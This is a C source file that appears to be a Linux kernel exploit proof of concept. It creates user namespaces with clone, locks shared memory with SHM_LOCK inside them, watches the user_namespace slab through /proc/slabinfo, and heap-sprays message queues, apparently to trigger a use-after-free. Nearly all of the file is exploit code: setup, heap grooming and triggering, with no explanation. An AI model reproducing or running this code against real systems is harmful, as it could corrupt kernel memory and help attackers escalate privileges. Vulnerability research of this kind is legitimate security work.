#include <linux/limits.h>
#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/shm.h>
#include <sys/sem.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <time.h>

typedef struct {
  long mtype;
  char mtext[1];
} msg;



int32_t make_queue(key_t key, int msgflg) {
    int32_t result;
    if ((result = msgget(key, msgflg)) == -1) {
        perror("msgget failure");
        exit(-1);
    }
    return result;
}

ssize_t get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) {
    ssize_t ret;
    ret = msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);
    if (ret < 0) {
        perror("msgrcv");
        //exit(-1);
    }
    return ret;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg) {
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1) {
        perror("msgsend failure");
        //exit(-1);
    }
    return;
}

#define SEGMENT_SIZE 0x132000
#define SPRAY_1024 1000


int spray_1024_qids[SPRAY_1024];
uint64_t setxattr_bufs[SPRAY_1024];
pthread_t thids[SPRAY_1024];

void generic_spray(uint64_t size, uint64_t count)
{
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;

    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < count; i++)
    {
        int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(spray, message, size - 0x30, 0);
    }
    return;
}

void spray_1024() {

    char buffer[0x4000] = {0};
    msg *message = (msg *)buffer;

    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < SPRAY_1024; i++) {
        int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(spray, message, 1024 - 0x30, 0);
        spray_1024_qids[i] = spray;
    }
 
    /* int x; */
    /* for (int i = 0; i < 10; i++) { */
    /*     x = open("/dev/ptmx", O_RDWR | O_NOCTTY); */
    /*     if (x == -1) { */
    /*         perror("/dev/ptmx"); */
    /*     } */
    /* } */
}
/* A simple error-handling function: print an error message based
  on the value in 'errno' and terminate the calling process. */

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                       } while (0)

struct child_args {
   char **argv;        /* Command to be executed by child, with args */
   int    pipe_fd[2];  /* Pipe used to synchronize parent and child */
};

static int verbose;

/* Update the mapping file 'map_file', with the value provided in
  'mapping', a string that defines a UID or GID mapping. A UID or
  GID mapping consists of one or more newline-delimited records
  of the form:

      ID_inside-ns    ID-outside-ns   length

  Requiring the user to supply a string that contains newlines is
  of course inconvenient for command-line use. Thus, we permit the
  use of commas to delimit records in this string, and replace them
  with newlines before writing the string to the file. */

static void update_map(char *mapping, char *map_file)
{
   int fd;
   size_t map_len;     /* Length of 'mapping' */

   /* Replace commas in mapping string with newlines. */

   map_len = strlen(mapping);
   for (int j = 0; j < map_len; j++)
       if (mapping[j] == ',')
           mapping[j] = '\n';

   fd = open(map_file, O_RDWR);
   if (fd == -1) {
       fprintf(stderr, "ERROR: open %s: %s\n", map_file,
               strerror(errno));
       exit(EXIT_FAILURE);
   }

   if (write(fd, mapping, map_len) != map_len) {
       fprintf(stderr, "ERROR: write %s: %s\n", map_file,
               strerror(errno));
       exit(EXIT_FAILURE);
   }

   close(fd);
}

/* Linux 3.19 made a change in the handling of setgroups(2) and the
  'gid_map' file to address a security issue. The issue allowed
  *unprivileged* users to employ user namespaces in order to drop
  The upshot of the 3.19 changes is that in order to update the
  'gid_maps' file, use of the setgroups() system call in this
  user namespace must first be disabled by writing "deny" to one of
  the /proc/PID/setgroups files for this namespace.  That is the
  purpose of the following function. */

static void
proc_setgroups_write(pid_t child_pid, char *str)
{
   char setgroups_path[PATH_MAX];
   int fd;

   snprintf(setgroups_path, PATH_MAX, "/proc/%jd/setgroups",
           (intmax_t) child_pid);

   fd = open(setgroups_path, O_RDWR);
   if (fd == -1) {

       /* We may be on a system that doesn't support
          /proc/PID/setgroups. In that case, the file won't exist,
          and the system won't impose the restrictions that Linux 3.19
          added. That's fine: we don't need to do anything in order
          to permit 'gid_map' to be updated.

          However, if the error from open() was something other than
          the ENOENT error that is expected for that case,  let the
          user know. */

       if (errno != ENOENT)
           fprintf(stderr, "ERROR: open %s: %s\n", setgroups_path,
               strerror(errno));
       return;
   }

   if (write(fd, str, strlen(str)) == -1)
       fprintf(stderr, "ERROR: write %s: %s\n", setgroups_path,
           strerror(errno));

   close(fd);
}

void *sh_mem;
int segment_id;

static int block_shared_memory(void *arg)
{
    printf("BLOCK SHARED MEMORY EXECUTING\n");
    printf("eUID = %ld;  eGID = %ld;  \n", (long) geteuid(), (long) getegid());
    printf("SHM_LOCK: %d\n", SHM_LOCK);
    shmctl(segment_id, SHM_LOCK, NULL);
    printf("BLOCK SHARED MEMORY EXIT\n");
    exit(0);
}

#define STACK_SIZE (1024 * 1024)

static char child_stack[STACK_SIZE];    /* Space for child's stack */

static int use_shared_memory(void *args) {
    printf("USE SHARED MEMORY EXECUTING\n");
    for (int i = 0; i < 10; i++) {
        char *x = "bhoo";
        memcpy(sh_mem, (void *)x, 3);
    }
    printf("USE SHARED MEMORY EXIT\n");
    exit(0);
}

int dummy_child(void *args) {
    // printf("DUMMY CHILD\n");
    sleep(10);
    int x = 2 + 5 + ((int)time(NULL) % 10);
    exit(x);
}

#define num_dummy_child 1200

int pid_dummy_childs[num_dummy_child];
void **stack_dummy_childs;

int main(int argc, char *argv[])
{
    fflush(stdout);
    setvbuf(stdout, NULL, _IONBF, 0);
    int flags, opt, map_zero;
    pid_t child_pid;
    struct child_args args;
    char *uid_map, *gid_map;
    const int MAP_BUF_SIZE = 100;
    char map_buf[MAP_BUF_SIZE];
    char map_path[PATH_MAX];

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set) == -1) {
        perror("sched_setaffinity()");
        exit(1);
    }

    flags = 0;
    verbose = 1;
    gid_map = "0 1000 1";
    uid_map = "0 1000 1";
    map_zero = 0;
    flags |= CLONE_NEWUSER;

    FILE *fp = fopen("/proc/slabinfo", "r");
    char * line = NULL;
    size_t len = 0;
    ssize_t read;
    int size_lines = 0;
    int found = 0;
    while ((read = getline(&line, &len, fp)) != -1) {
        if (!found) {
            size_lines += len;
        }
        /* printf("Retrieved line of length %zu:\n", read); */
        /* printf("%s", line); */
        if (strncmp(line, "user_namespace", 14) == 0) {
            found = 1;
            break;
            printf("FOUND: %d\n", size_lines);
        }
    }
    fclose(fp);
    fp = fopen("/proc/slabinfo", "r");

    segment_id = shmget (IPC_PRIVATE, SEGMENT_SIZE, IPC_CREAT | IPC_EXCL | S_IRUSR | S_IWUSR);
    sh_mem = (void *)shmat(segment_id, NULL, 0);

    printf("CREATED segment id: %d\t address: %p\n", segment_id, sh_mem);

    stack_dummy_childs = malloc(sizeof(void *) * num_dummy_child);
    int fseek_line = 5580 - 107;
    for (int j = 0; j < num_dummy_child; j++) {
        stack_dummy_childs[j] = malloc(0x50);
        pid_dummy_childs[j] = clone(dummy_child, stack_dummy_childs[j], flags | SIGCHLD, NULL);
        fseek(fp, fseek_line, SEEK_SET);
        getline(&line, &len, fp);
        /* printf("slab: %s", line); */
    }

    /* kill(child_pid, SIGTERM); */

    printf("CREATING BLOCK SHARED MEMORY CHILD\n");
    child_pid = clone(block_shared_memory, child_stack + STACK_SIZE, flags | SIGCHLD, NULL);
    if (child_pid == -1)
        errExit("clone");

    void *child_shared_stack = malloc(100);
    printf("CREATING USE SHARED MEMORY CHILD\n");
    int child_shared = -1;
    child_shared = clone(use_shared_memory, child_shared_stack, flags | SIGCHLD, NULL);

    if (waitpid(child_pid, NULL, 0) == -1)
        errExit("waitpid");
    printf("BLOCK SHARED MEMORY CHILD EXITED\n");
    if (waitpid(child_shared, NULL, 0) == -1)
        errExit("waitpid");
    printf("USE SHARED MEMORY CHILD EXITED\n");

    sleep(10);

    // spray_1024();
    generic_spray(600, 1000);
    printf("CONTENT OF SHARED MEMORY: %s\n", (char *)sh_mem);
    printf("DESTROY SHARED MEMORY\n");
    shmdt(sh_mem);
    shmctl(segment_id, IPC_RMID, 0);
    printf("DESTROYED SHARED MEMORY\n");

    for (int j = 0; j < num_dummy_child; j++) {
        if (waitpid(pid_dummy_childs[j], NULL, 0) == -1)
            errExit("waitpid");
    }
    printf("EXIT MAIN PROCESS\n");

    exit(EXIT_SUCCESS);
}

